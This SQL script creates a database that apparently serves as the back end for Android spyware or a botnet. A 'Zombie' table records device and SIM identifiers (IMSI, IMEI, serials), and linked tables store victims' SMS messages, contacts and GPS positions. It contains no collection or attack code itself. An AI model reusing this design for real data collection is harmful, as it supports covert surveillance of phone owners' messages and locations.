DROP DATABASE SCI;
CREATE DATABASE SCI DEFAULT CHARACTER SET 'utf8';
use SCI;

CREATE TABLE Zombie (
    email           VARCHAR(255)    NOT NULL,
    IMSI            VARCHAR(16)     NOT NULL,
    MCC_MNC         VARCHAR(8)      NOT NULL,
    simSerialNo     VARCHAR(16)     NOT NULL,
    simNo           VARCHAR(32)     NOT NULL,
    IMEI            VARCHAR(16)     NOT NULL, 
    deviceSerialNo  VARCHAR(16)     NOT NULL,
    manufacturer    VARCHAR(16)     NOT NULL,
    model           VARCHAR(16)     NOT NULL,
    android         VARCHAR(8)      NOT NULL,
    PRIMARY KEY(email)
) ENGINE InnoDB DEFAULT CHARSET=utf8; 

CREATE TABLE SMS (
    idS             INTEGER         NOT NULL,
    email           VARCHAR(255)    NOT NULL,
    simNo           VARCHAR(32)     NOT NULL,
    thread          INTEGER         NOT NULL,
    contactNo       VARCHAR(32)     NOT NULL,
    contactName     VARCHAR(32)     NOT NULL,
    message         TEXT,
    date            TIMESTAMP       NOT NULL,
    type            VARCHAR(8)      NOT NULL,
    PRIMARY KEY(idS, email),
    FOREIGN KEY(email) REFERENCES Zombie(email)
        ON DELETE CASCADE
        ON UPDATE CASCADE
) ENGINE InnoDB DEFAULT CHARSET=utf8;

CREATE TABLE Position (
    idP             INTEGER         NOT NULL AUTO_INCREMENT,
    email           VARCHAR(255)    NOT NULL,
    simNo           VARCHAR(32)     NOT NULL,
    address         VARCHAR(1024)   NOT NULL,
    longitude       DECIMAL(16,12)  NOT NULL,
    latitude        DECIMAL(16,12)  NOT NULL,
    altitude        DECIMAL(16,12)  NOT NULL,
    accuracy        DECIMAL(6,3)    NOT NULL,
    provider        VARCHAR(8)      NOT NULL,
    date            TIMESTAMP       NOT NULL,
    PRIMARY KEY(idP),
    FOREIGN KEY(email) REFERENCES Zombie(email)
        ON DELETE CASCADE
        ON UPDATE CASCADE
) ENGINE InnoDB DEFAULT CHARSET=utf8;